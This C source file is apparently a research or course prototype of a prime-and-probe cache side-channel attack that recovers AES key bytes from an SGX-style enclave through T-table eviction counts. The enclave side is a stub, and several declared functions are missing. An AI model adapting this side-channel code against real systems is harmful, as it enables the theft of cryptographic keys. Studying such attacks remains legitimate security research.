#define _GNU_SOURCE
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>
#include <pthread.h>
#include <sys/mman.h>
#include <time.h>
#include "set_sched.h"
#include "cache.h"

#define BLOCK_SIZE 16
#define ENTRY_SIZE 4
#define KEYLEN 16
#define ROUNDS 1
#define THRESHOLD 0

// Sched. policy
#define SCHED_POLICY SCHED_RR
// Max. realtime priority
#define PRIORITY 0

/*
 * Mainthread and enclave need to be on the same 
 * phy. core but different log. core.
 * cat /proc/cpuinfo | grep 'core id'
 * core id		: 0
 * core id		: 1
 * core id		: 2
 * core id		: 3
 * core id		: 0
 * core id		: 1
 * core id		: 2
 * core id		: 3
 */
#define CPU 0
#define ENCLAVE_CPU 5



static void usage(char**);
static void enclave_thread(void);
static int eliminate(void);
static void calcBaseKey(void);
static void calcKey(void);
static void printKey(void);
static void decryptSecret(void);

/*
 * Global variables exist for alignment reasons.
 * Must not interfer with SBox cachelines.
 */
static int alignment_dummy __attribute__ ((aligned(4096)));
static int alignment_dummy_2 __attribute__ ((aligned(1024)));
static uint32_t evict_count[TABLESIZE/CACHELINESIZE];
static unsigned int n_hits;
static size_t i, j, x, count, cand, byte;
static int done_ret;

static pthread_t thread;
static pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
static pid_t pid;
static volatile int flag;
static volatile int flag_out;
static volatile int done = 0;
static unsigned char candidates[16][256];
static int candidates_count[16];
static unsigned char cand_index;
static int attack_round = 0;

static uint8_t secret_key[KEYLEN];
static unsigned char in[BLOCK_SIZE];
static unsigned char out[BLOCK_SIZE];
static unsigned char enc_msg[BLOCK_SIZE];
static unsigned char *msg = "Top secret msg!";

/*
 * Print usage.
 */
void usage(char **argv) {
	printf("Usage: %s\n", argv[0]);
}

/*
 * Pthread-function for running the enclave.
 */
static void enclave_thread(void) {

	pthread_mutex_lock(&lock);

	// set cpu for enclave thread
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(ENCLAVE_CPU, &set);
	errno = pthread_setaffinity_np(thread, sizeof(cpu_set_t), &set);
	if(errno != 0) {
		exit(EXIT_FAILURE);
	}

	fprintf(stderr, "[Enclave] Enclave running on %d\n", sched_getcpu());
	pthread_mutex_unlock(&lock);

	// TODO CUSTEM CODE
	for(;;);
}

/*
 * Elimination Method for finding the correct key cleanUp.
 * Source: https://dl.acm.org/citation.cfm?id=1756531
 */
static int eliminate(void) {
	done_ret = 0;
	// take every cache that wasn't evicted
	for(count = 0; count < BLOCK_SIZE; count++) {
		if (evict_count[count] > THRESHOLD) {
			continue;
		}
		done_ret = 1;
		// remove resulting keybytes from candidates list
		for(cand = 0; cand < BLOCK_SIZE; cand++) {
			for(byte = 0; byte < BLOCK_SIZE; byte++) {
				cand_index = out[cand] ^ (Te4_0[((CACHELINESIZE/ENTRY_SIZE)*count)+byte] >> 24);
				if (candidates[cand][cand_index] != 0x00) {
					// eliminate bytes from key candidates, only most significant byte of entry is needed
					candidates[cand][cand_index] = 0x00;
					// reduce number of candidates for keybyte
					candidates_count[cand] -= 1;
				}
				// if every keybyte has one candidate left, we're finished
				if (candidates_count[cand] > 1) {
					done_ret = 0;
				}
			} 
		}
	}	
	return done_ret;
}


/*
 * Start enclave in seperated pthread, perform measurement in main thread.
 */
int main(int argc,char **argv) {
	// align stack, so it doesn't interfer with the measurement
	volatile int alignment_stack __attribute__ ((aligned(4096)));
	volatile int alignment_stack_2 __attribute__ ((aligned(1024)));

	if (argc != 1) {
		usage(argv);
		return EXIT_FAILURE;
	}
	
	// fill candidates
	for(j=0; j < BLOCK_SIZE; j++) {
		candidates_count[j] = 256;
		for(i=0; i<BLOCK_SIZE*BLOCK_SIZE; i++) {
			candidates[j][i] = 1;
		}
	}	


	//pin to cpu 
	if ((pin_cpu(CPU)) == -1) {
		fprintf(stderr, "[Attacker] Couln't pin to CPU: %d\n", CPU);
		return EXIT_FAILURE;
	}

	// set sched_priority
	if ((set_real_time_sched_priority(SCHED_POLICY, PRIORITY)) == -1) {
		fprintf(stderr, "[Attacker] Couln't set scheduling priority\n");
		return EXIT_FAILURE;
	}

	// Start enclave thread
	fprintf(stderr, "[Attacker] Creating thread\n");
	errno = pthread_create(&thread, NULL, (void* (*) (void*)) enclave_thread, NULL);	
	if (errno != 0) {
		return EXIT_FAILURE;
	}	

	// initalize random generator
	srand(time(NULL));

	pthread_mutex_lock(&lock);
	fprintf(stderr, "[Attacker] Attacker running on %d\n", sched_getcpu());
	pthread_mutex_unlock(&lock);
	for (;;) {
		
		memset(evict_count, 0x0, (TABLESIZE/CACHELINESIZE)*4);
		for(j=0; j<ROUNDS; j++) {
			for (i = 0; i < TABLESIZE/CACHELINESIZE; i++) {
				// aes round 0-9
				flag = 0x1;
				while(flag_out != 0x1);

				// fill cache
				prime();

				// aes round 10
				flag = 0x2;
				while(flag_out != 0x2);


				// probe cache
				evict_count[i] += probe(i);

				// finish
				flag = 0x3;
				while(flag_out != 0x3);
			}
		}

		fprintf(stderr, "[Attacker] [%d] Remaining key bytes: ", attack_round++);
		for(i = 0; i < (TABLESIZE/CACHELINESIZE); i++) {
			fprintf(stderr, "%d ", candidates_count[i]);
		}
		fprintf(stderr, "\n");

		if (eliminate() == 1) {
			fprintf(stderr, "[Attacker] Found!\n");
		}

	}
	fprintf(stderr, "[Attacker] Stopping enclave\n");
	pthread_join(thread, NULL);
	return EXIT_SUCCESS;
}

